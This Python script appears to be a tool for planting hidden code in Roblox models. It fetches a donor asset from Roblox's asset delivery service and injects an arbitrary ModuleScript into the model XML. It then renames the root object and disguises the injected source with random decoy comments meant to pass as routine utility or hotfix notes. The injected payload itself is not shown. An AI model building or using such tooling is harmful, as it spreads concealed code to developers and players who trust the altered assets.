import re
import random
import requests


ASSET_DELIVERY = "https://assetdelivery.roblox.com/v1/asset/?id="

JUNK_COMMENTS = [
    "-- cache preload v2",
    "-- spring util internal",
    "-- @deprecated use v3",
    "-- perf: lazy init",
    "-- hotfix: nil guard",
    "-- TODO: cleanup refs",
    "-- v1.4.2 compat shim",
    "-- signal bridge patch",
]


def fetch_donor_rbxmx(asset_id: int) -> str | None:
    r = requests.get(f"{ASSET_DELIVERY}{asset_id}", allow_redirects=True, timeout=15)
    if r.status_code != 200:
        print(f"  [!] Donor fetch failed ({asset_id}): {r.status_code}")
        return None
    ct = r.headers.get("content-type", "")
    if "xml" not in ct and "octet" not in ct and len(r.text) < 100:
        print(f"  [!] Donor {asset_id} returned unexpected content-type: {ct}")
        return None
    return r.text


def inject_into_rbxmx(rbxmx: str, module_source: str, module_name: str) -> str:
    escaped = (module_source
               .replace("&", "&amp;")
               .replace("<", "&lt;")
               .replace(">", "&gt;"))

    inject_block = f"""  <Item class="ModuleScript" referent="ZBXINJECT01">
    <Properties>
      <string name="Name">{module_name}</string>
      <ProtectedString name="Source"><![CDATA[{module_source}]]></ProtectedString>
    </Properties>
  </Item>"""

    if "</roblox>" in rbxmx:
        return rbxmx.replace("</roblox>", inject_block + "\n</roblox>")
    return rbxmx + "\n" + inject_block


def mutate_root_name(rbxmx: str, new_name: str) -> str:
    return re.sub(
        r'(<string name="Name">)[^<]*(</string>)',
        rf'\g<1>{new_name}\g<2>',
        rbxmx,
        count=1,
    )


def obfuscate_source(source: str) -> str:
    noise = "\n".join(random.sample(JUNK_COMMENTS, k=3))
    salt  = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=4))

    header = f"""-- {salt} util module
{noise}
local _ENV = _ENV or getfenv()
"""
    return header + source
